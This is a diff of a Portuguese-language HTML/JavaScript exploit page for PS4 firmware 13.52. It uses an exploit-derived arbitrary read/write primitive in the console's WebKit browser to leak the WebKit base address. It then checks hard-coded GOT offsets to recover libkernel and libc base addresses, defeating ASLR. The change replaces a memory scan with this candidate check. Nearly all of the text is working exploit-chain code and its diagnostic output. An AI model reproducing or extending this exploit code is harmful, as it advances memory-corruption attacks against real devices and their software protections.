@@ -1,11 +1,10 @@
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 13.52 — GOT scan</title>
+<title>PS4 13.52 — validar candidatos GOT</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -23,7 +22,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #st{font-size:12px;color:#bbb;flex:1}
 #bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
-#con{width:100%;max-width:720px;height:300px;background:#050508;
+#con{width:100%;max-width:720px;height:320px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -41,7 +40,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 </style>
 </head>
 <body>
-<h1>PS4 13.52 — GOT scan</h1>
+<h1>PS4 13.52 — validar GOT</h1>
 <div id="fw">detectando...</div>
 <div id="sb"><div id="dot" class="r"></div><div id="st">Inicializando...</div></div>
 <div id="bars"><span id="ba">tentativa: 1</span><span id="bg">estágio: init</span></div>
@@ -52,9 +51,9 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
   <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
   <div class="card"><div class="cl">Status</div><div class="cv na" id="c-g">Aguardando</div></div>
 </div>
-<div id="cbox"><div class="ct">// === CANDIDATOS GOT ===</div><div id="c-out"></div></div>
+<div id="cbox"><div class="ct">// === VALIDAÇÃO ===</div><div id="c-out"></div></div>
 
-<script src="./13.52.js?v=7"></script>
+<script src="./13.52.js?v=8"></script>
 <script type="module">
 import { int64 } from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
@@ -71,7 +70,7 @@ function log(m, c='i') {
   d.className = c; d.textContent = m;
   $con.appendChild(d);
   $con.scrollTop = $con.scrollHeight;
-  while ($con.children.length > 800) $con.removeChild($con.firstChild);
+  while ($con.children.length > 700) $con.removeChild($con.firstChild);
 }
 function logH(m) { log('=== ' + m + ' ===', 's'); }
 function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
@@ -80,17 +79,31 @@ function setCard(id, v) {
   if (!el) return;
   el.textContent = v; el.classList.remove('na');
 }
-function yield0() { return new Promise(r => setTimeout(r, 0)); }
 
 function isModulePtr(v) {
   if (!v || typeof v.hi !== 'number') return false;
   const hi = v.hi >>> 0;
-  // PS4 usermode típico ~0x8xxxxxxx000
   return hi >= 0x8 && hi <= 0x8f;
 }
 function pageAligned(v) {
   return ((v.low >>> 0) & 0xfff) === 0;
 }
+function hexb(n) {
+  return ('0' + (n & 0xff).toString(16)).slice(-2);
+}
+
+// Candidatos do scan 16MB (hits=3 no melhor cluster)
+const CAND_LK_GOT = [
+  0x334CB68, // hits=3 cluster
+  0x33A89C0,
+  0x3714E58,
+  0x43CB6C0, // cluster secundário
+  0x4C60938
+];
+// libc scan deu falso positivo; não validar 0x3132A68 como certo
+const CAND_LC_GOT = [
+  0x3132A68 // só para mostrar que falha / reavaliar
+];
 
 async function main() {
   const ua = navigator.userAgent;
@@ -118,7 +131,6 @@ async function main() {
   log('[+] core.js OK', 'ok');
 
   setStatus('R/W...', 'r');
-  logH('R/W');
   let p;
   try {
     p = installWindowP(carrier, {
@@ -132,28 +144,27 @@ async function main() {
   }
   log('[+] window.p OK', 'ok');
 
-  // ─── WebKit base ───
+  // WebKit base
   logH('WEBKIT BASE');
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    log('[-] sem __ps5NativeCtor', 'e');
+    log('[-] sem ctor', 'e');
     setStatus('Sem ctor', 'e');
     return;
   }
-  const candidates = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined'
+  const hcs = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined'
     && OFFSET_wk_host_constructor_candidates.length)
     ? OFFSET_wk_host_constructor_candidates : [0x36F9E20];
 
   let webkitBase = null, usedHc = 0;
-  for (let i = 0; i < candidates.length; i++) {
-    const hc = candidates[i];
+  for (let i = 0; i < hcs.length; i++) {
+    const hc = hcs[i];
     const wb = ctor - hc;
     if (wb >= 0x800000000 && wb < 0x900000000 && (wb % 0x4000) === 0) {
       const hi = Math.floor(wb / 0x100000000);
       const lo = wb - hi * 0x100000000;
       webkitBase = new int64(lo >>> 0, hi >>> 0);
       usedHc = hc;
-      log('[+] base=0x' + wb.toString(16) + ' hc=0x' + hc.toString(16), 'ok');
       break;
     }
   }
@@ -162,188 +173,214 @@ async function main() {
     setStatus('Base inválida', 'e');
     return;
   }
+  log('[+] webkitBase=0x' + webkitBase.toString(16) + ' hc=0x' + usedHc.toString(16), 'ok');
   setCard('c-wk', '0x' + webkitBase.toString(16));
 
-  // validar ctor
   try {
     const ctorI64 = new int64((ctor % 0x100000000) >>> 0, Math.floor(ctor / 0x100000000) >>> 0);
     const a = p.read8(ctorI64);
     const b = p.read8(webkitBase.add32(usedHc));
-    if (a.toString(16) === b.toString(16)) log('[+] ctor MATCH', 'ok');
-    else log('[!] ctor DIFF', 'w');
+    log(a.toString(16) === b.toString(16) ? '[+] ctor MATCH' : '[!] ctor DIFF', a.toString(16) === b.toString(16) ? 'ok' : 'w');
   } catch (e) {
-    log('[!] validação: ' + e.message, 'w');
+    log('[!] ctor check: ' + e.message, 'w');
   }
 
+  const off_lk_fail  = (typeof OFFSET_lk___stack_chk_fail !== 'undefined') ? OFFSET_lk___stack_chk_fail : 0x29F50;
+  const off_lk_guard = (typeof OFFSET_lk___stack_chk_guard_data !== 'undefined' && OFFSET_lk___stack_chk_guard_data)
+    ? OFFSET_lk___stack_chk_guard_data : 0x61410;
   const off_lc_memset = (typeof OFFSET_lc_memset !== 'undefined') ? OFFSET_lc_memset : 0x27350;
-  const off_lk_fail   = (typeof OFFSET_lk___stack_chk_fail !== 'undefined') ? OFFSET_lk___stack_chk_fail : 0x29F50;
-  const off_lk_guard  = (typeof OFFSET_lk___stack_chk_guard_data !== 'undefined' && OFFSET_lk___stack_chk_guard_data)
-    ? OFFSET_lk___stack_chk_guard_data
-    : ((typeof OFFSET_lk___stack_chk_guard !== 'undefined') ? OFFSET_lk___stack_chk_guard : 0x61410);
 
-  log('  lc_memset=0x' + off_lc_memset.toString(16)
-    + ' lk_fail=0x' + off_lk_fail.toString(16)
-    + ' lk_guard=0x' + off_lk_guard.toString(16), 'd');
+  // Outros RVAs libkernel 13.00 para smoke-test se a base for boa
+  const LK_SMOKE = [
+    { name: 'sceKernelDlsym', off: 0x2E50 },
+    { name: 'getpid', off: 0x2CB70 },
+    { name: 'sceKernelSendNotificationRequest', off: 0x8B0 },
+    { name: '__stack_chk_fail', off: off_lk_fail }
+  ];
 
-  // ─── SCAN GOT ───
-  // Centro: PLTGOT 13.00. Janela ±2MB. Passo 8. Yield por página.
-  const CENTER = 0x3CB8BE0;
-  const RADIUS = 0x2000000;  // ±16 MB 
-  const startOff = Math.max(0, CENTER - RADIUS);
-  const endOff   = CENTER + RADIUS;
+  // ─── Validar cada candidato libkernel GOT ───
+  logH('VALIDAR LIBKERNEL GOT');
+  setStatus('Validando libkernel...', 'r');
 
-  logH('SCAN GOT ±2MB @ 0x' + CENTER.toString(16));
-  log('[*] range RVA 0x' + startOff.toString(16) + ' .. 0x' + endOff.toString(16), 'i');
-  setStatus('Scanning GOT...', 'r');
-  setCard('c-g', 'scan...');
-
-  // candidatos: off → { ptr, libcBase?, lkBase? }
-  const libcHits = {};  // key = libcBase str → count + sample offs
-  const lkHits   = {};
-  let pagesOk = 0, pagesFail = 0, ptrCount = 0;
-  let lastLog = 0;
-
-  for (let page = startOff & ~0xfff; page < endOff; page += 0x1000) {
-    let pageHadRead = false;
+  const lkResults = [];
+  for (let i = 0; i < CAND_LK_GOT.length; i++) {
+    const gotOff = CAND_LK_GOT[i];
+    log('--- GOT+0x' + gotOff.toString(16) + ' ---', 'a');
+    let ptr;
     try {
-      // probe 1 dword no início da página
-      p.read4(webkitBase.add32(page));
-      pageHadRead = true;
-      pagesOk++;
+      ptr = p.read8(webkitBase.add32(gotOff));
     } catch (e) {
-      pagesFail++;
-      await yield0();
+      log('  read FAIL: ' + e.message, 'e');
+      continue;
+    }
+    log('  ptr = 0x' + ptr.toString(16) + (isModulePtr(ptr) ? ' (módulo?)' : ' (não módulo)'),
+      isModulePtr(ptr) ? 'ok' : 'w');
+
+    if (!isModulePtr(ptr)) {
+      lkResults.push({ gotOff, ok: false, reason: 'ptr inválido' });
       continue;
     }
 
-    for (let off = page; off < page + 0x1000 && off < endOff; off += 8) {
-      if (off < startOff) continue;
-      let val;
-      try {
-        val = p.read8(webkitBase.add32(off));
-      } catch (e) {
-        break;
+    // base = ptr - fail
+    let baseFail, baseGuard;
+    try {
+      baseFail = ptr.sub32(off_lk_fail);
+      baseGuard = ptr.sub32(off_lk_guard);
+    } catch (e) {
+      log('  sub FAIL', 'e');
+      continue;
+    }
+
+    const failOK = pageAligned(baseFail) && isModulePtr(baseFail);
+    const guardOK = pageAligned(baseGuard) && isModulePtr(baseGuard);
+    log('  base(fail-0x' + off_lk_fail.toString(16) + ') = 0x' + baseFail.toString(16)
+      + (failOK ? ' OK' : ' bad'), failOK ? 'ok' : 'd');
+    log('  base(guard-0x' + off_lk_guard.toString(16) + ') = 0x' + baseGuard.toString(16)
+      + (guardOK ? ' OK' : ' bad'), guardOK ? 'ok' : 'd');
+
+    const base = failOK ? baseFail : (guardOK ? baseGuard : null);
+    const usedSub = failOK ? off_lk_fail : (guardOK ? off_lk_guard : 0);
+    if (!base) {
+      lkResults.push({ gotOff, ok: false, reason: 'base não alinhada' });
+      continue;
+    }
+
+    // Ler 8 bytes no alvo (deve parecer código se for função)
+    let bytes = [];
+    let codeOK = false;
+    try {
+      const target = ptr; // endereço da função apontada
+      for (let b = 0; b < 8; b++) {
+        bytes.push(p.read1(target.add32(b)));
       }
-      if (!isModulePtr(val)) continue;
-      ptrCount++;
-
-      // testar como memset → libc
-      try {
-        const lb = val.sub32(off_lc_memset);
-        if (pageAligned(lb) && isModulePtr(lb)) {
-          const k = lb.toString(16);
-          if (!libcHits[k]) libcHits[k] = { base: lb, offs: [], n: 0 };
-          libcHits[k].n++;
-          if (libcHits[k].offs.length < 6) libcHits[k].offs.push(off);
-        }
-      } catch (e) {}
-
-      // testar como stack_chk_fail → libkernel
-      try {
-        const kb = val.sub32(off_lk_fail);
-        if (pageAligned(kb) && isModulePtr(kb)) {
-          const k = kb.toString(16);
-          if (!lkHits[k]) lkHits[k] = { base: kb, offs: [], n: 0 };
-          lkHits[k].n++;
-          if (lkHits[k].offs.length < 6) lkHits[k].offs.push(off);
-        }
-      } catch (e) {}
-
-      // testar como guard data
-      try {
-        const kb = val.sub32(off_lk_guard);
-        if (pageAligned(kb) && isModulePtr(kb)) {
-          const k = kb.toString(16);
-          if (!lkHits[k]) lkHits[k] = { base: kb, offs: [], n: 0 };
-          lkHits[k].n++;
-          if (lkHits[k].offs.length < 6) lkHits[k].offs.push(off);
-        }
-      } catch (e) {}
+      // heurística: não tudo 0 / não 0xCC, primeiro byte opcode comum
+      const z = bytes.every(x => x === 0);
+      const cc = bytes.every(x => x === 0xcc);
+      const b0 = bytes[0];
+      // prologos comuns: 55, 48, 41, 53, 56, 57, 40, f3, etc.
+      const looks = !z && !cc && b0 !== 0x00 && b0 !== 0xff;
+      codeOK = looks;
+      log('  bytes@ptr = ' + bytes.map(hexb).join(' ') + (looks ? ' (código?)' : ' (suspeito)'),
+        looks ? 'ok' : 'w');
+    } catch (e) {
+      log('  bytes@ptr FAIL: ' + e.message, 'e');
     }
 
-    // progresso a cada 64 páginas
-    if ((pagesOk + pagesFail) - lastLog >= 64) {
-      lastLog = pagesOk + pagesFail;
-      const pct = Math.floor(100 * (page - startOff) / (endOff - startOff));
-      log('[scan] ' + pct + '% pagesOk=' + pagesOk + ' fail=' + pagesFail
-        + ' ptrs=' + ptrCount
-        + ' libcCand=' + Object.keys(libcHits).length
-        + ' lkCand=' + Object.keys(lkHits).length, 'd');
-      setStatus('Scan ' + pct + '%...', 'r');
-      await yield0();
+    // Smoke: ler 1º byte em base+outros offs 13.00
+    let smokeOk = 0, smokeTry = 0;
+    for (let s = 0; s < LK_SMOKE.length; s++) {
+      const sm = LK_SMOKE[s];
+      smokeTry++;
+      try {
+        const addr = base.add32(sm.off);
+        const b0 = p.read1(addr);
+        const ok = b0 !== 0x00 && b0 !== 0xcc && b0 !== 0xff;
+        if (ok) smokeOk++;
+        log('  smoke ' + sm.name + ' @+0x' + sm.off.toString(16) + ' b0=0x' + hexb(b0)
+          + (ok ? ' ok' : ' bad'), ok ? 'd' : 'w');
+      } catch (e) {
+        log('  smoke ' + sm.name + ' FAIL', 'w');
+      }
     }
+
+    const score = (codeOK ? 2 : 0) + smokeOk;
+    log('  score=' + score + '/' + (2 + smokeTry), score >= 3 ? 'ok' : 'w');
+    lkResults.push({
+      gotOff, ok: score >= 3, score, base, usedSub, ptr, codeOK, smokeOk, smokeTry
+    });
   }
 
-  logH('RESULTADO SCAN');
-  log('[*] pagesOk=' + pagesOk + ' pagesFail=' + pagesFail + ' modulePtrs=' + ptrCount);
+  // Escolher melhor libkernel
+  lkResults.sort((a, b) => (b.score || 0) - (a.score || 0));
+  let bestLk = lkResults.find(r => r.ok) || lkResults[0];
+  let libKernelBase = null;
+  let bestGotLk = 0;
 
-  function topHits(map, label) {
-    const arr = Object.keys(map).map(k => map[k]);
-    arr.sort((a, b) => b.n - a.n);
-    log('[*] ' + label + ' candidatos: ' + arr.length);
-    for (let i = 0; i < Math.min(5, arr.length); i++) {
-      const h = arr[i];
-      log('  #' + (i + 1) + ' base=0x' + h.base.toString(16)
-        + ' hits=' + h.n
-        + ' offs=' + h.offs.map(o => '0x' + o.toString(16)).join(','),
-        i === 0 ? 'ok' : 'i');
-    }
-    return arr[0] || null;
-  }
-
-  const bestLc = topHits(libcHits, 'libc');
-  const bestLk = topHits(lkHits, 'libkernel');
-
-  let libcBase = null, libKernelBase = null;
-  let memsetImp = 0, guardImp = 0;
-
-  if (bestLc && bestLc.n >= 1) {
-    libcBase = bestLc.base;
-    memsetImp = bestLc.offs[0];
-    setCard('c-lc', '0x' + libcBase.toString(16));
-    log('[+] libcBase candidata 0x' + libcBase.toString(16)
-      + ' via GOT+0x' + memsetImp.toString(16), 'ok');
-  } else {
-    setCard('c-lc', 'não achou');
-    log('[-] nenhuma base libc com hit suficiente', 'w');
-  }
-
-  if (bestLk && bestLk.n >= 1) {
+  if (bestLk && bestLk.base && bestLk.score >= 2) {
     libKernelBase = bestLk.base;
-    guardImp = bestLk.offs[0];
+    bestGotLk = bestLk.gotOff;
     setCard('c-lk', '0x' + libKernelBase.toString(16));
-    log('[+] libkernelBase candidata 0x' + libKernelBase.toString(16)
-      + ' via GOT+0x' + guardImp.toString(16), 'ok');
+    logH('MELHOR LIBKERNEL');
+    log('[+] GOT+0x' + bestGotLk.toString(16)
+      + ' → base 0x' + libKernelBase.toString(16)
+      + ' sub=0x' + bestLk.usedSub.toString(16)
+      + ' score=' + bestLk.score, 'ok');
   } else {
-    setCard('c-lk', 'não achou');
-    log('[-] nenhuma base libkernel com hit suficiente', 'w');
+    setCard('c-lk', 'inválido');
+    log('[-] nenhum candidato libkernel passou na validação', 'e');
   }
 
-  const cbox = document.getElementById('cbox');
-  cbox.style.display = 'block';
-  document.getElementById('c-out').textContent =
-      'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
-      'libkernel Base  = ' + (libKernelBase ? '0x' + libKernelBase.toString(16) : 'N/A') + '\n' +
-      'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
-      '\n// candidatos a colar no 13.52.js\n' +
-      (memsetImp ? 'const OFFSET_wk_memset_import = 0x' + memsetImp.toString(16) + ';\n' : '') +
-      (guardImp  ? 'const OFFSET_wk___stack_chk_guard_import = 0x' + guardImp.toString(16) + ';\n' : '') +
-      'const OFFSET_lc_memset = 0x' + off_lc_memset.toString(16) + ';\n' +
-      'const OFFSET_lk___stack_chk_fail = 0x' + off_lk_fail.toString(16) + ';\n' +
-      '\npagesOk=' + pagesOk + ' pagesFail=' + pagesFail + ' ptrs=' + ptrCount;
-
-  if (libcBase && libKernelBase) {
-    setStatus('Scan OK — bases candidatas', 'ok');
-    setCard('c-g', 'candidatas');
-  } else if (libcBase || libKernelBase) {
-    setStatus('Scan parcial', 'w');
-    setCard('c-g', 'parcial');
-  } else if (ptrCount === 0) {
-    setStatus('Sem ptrs na janela — alargar scan ou dump 13.52', 'w');
-    setCard('c-g', 'vazio');
+  // ─── Validar candidato libc (esperado falhar) ───
+  logH('VALIDAR LIBC GOT (suspeito)');
+  let libcBase = null;
+  let bestGotLc = 0;
+  for (let i = 0; i < CAND_LC_GOT.length; i++) {
+    const gotOff = CAND_LC_GOT[i];
+    let ptr;
+    try {
+      ptr = p.read8(webkitBase.add32(gotOff));
+    } catch (e) {
+      log('GOT+0x' + gotOff.toString(16) + ' read fail', 'e');
+      continue;
+    }
+    log('GOT+0x' + gotOff.toString(16) + ' ptr=0x' + ptr.toString(16)
+      + (isModulePtr(ptr) ? '' : ' (não módulo)'), isModulePtr(ptr) ? 'i' : 'w');
+    if (!isModulePtr(ptr)) continue;
+    const base = ptr.sub32(off_lc_memset);
+    const ok = pageAligned(base) && isModulePtr(base);
+    log('  base=0x' + base.toString(16) + (ok ? ' aligned' : ' REJECT'), ok ? 'w' : 'e');
+    if (!ok) continue;
+    // bytes em memset
+    try {
+      const b0 = p.read1(ptr);
+      log('  memset b0=0x' + hexb(b0), 'd');
+      if (b0 !== 0 && b0 !== 0xcc && isModulePtr(base) && (base.hi >>> 0) >= 0x8 && (base.hi >>> 0) <= 0x8f) {
+        libcBase = base;
+        bestGotLc = gotOff;
+      }
+    } catch (e) {}
+  }
+  if (libcBase) {
+    setCard('c-lc', '0x' + libcBase.toString(16));
+    log('[+] libc candidata (ainda verificar) 0x' + libcBase.toString(16), 'w');
   } else {
-    setStatus('Ptrs achados, mas nenhuma base alinhada', 'w');
-    setCard('c-g', 'sem base');
+    setCard('c-lc', 'não validou');
+    log('[-] libc não validou (esperado se 13.00 memset off errado)', 'w');
+  }
+
+  // Resumo
+  const lines = [];
+  lines.push('WebKit Base    = 0x' + webkitBase.toString(16));
+  lines.push('libkernel Base = ' + (libKernelBase ? '0x' + libKernelBase.toString(16) : 'N/A'));
+  lines.push('libSceLibc Base= ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A'));
+  lines.push('');
+  if (bestGotLk) {
+    lines.push('// libkernel — melhor GOT desta run');
+    lines.push('const OFFSET_wk___stack_chk_guard_import = 0x' + bestGotLk.toString(16) + ';');
+    lines.push('const OFFSET_lk___stack_chk_fail = 0x' + off_lk_fail.toString(16) + ';');
+  }
+  if (bestGotLc) {
+    lines.push('const OFFSET_wk_memset_import = 0x' + bestGotLc.toString(16) + ';');
+    lines.push('const OFFSET_lc_memset = 0x' + off_lc_memset.toString(16) + ';');
+  }
+  lines.push('');
+  lines.push('// scores libkernel:');
+  for (let i = 0; i < lkResults.length; i++) {
+    const r = lkResults[i];
+    lines.push('  GOT+0x' + r.gotOff.toString(16)
+      + ' score=' + (r.score != null ? r.score : '-')
+      + ' ' + (r.ok ? 'PASS' : (r.reason || 'fail')));
+  }
+
+  document.getElementById('cbox').style.display = 'block';
+  document.getElementById('c-out').textContent = lines.join('\n');
+
+  if (libKernelBase && libKernelBase.hi >= 0x8) {
+    setStatus('Validação libkernel OK — corre de novo (ASLR)', 'ok');
+    setCard('c-g', 'LK ok');
+  } else {
+    setStatus('Validação fraca / falhou', 'w');
+    setCard('c-g', 'falhou');
   }
 }
 
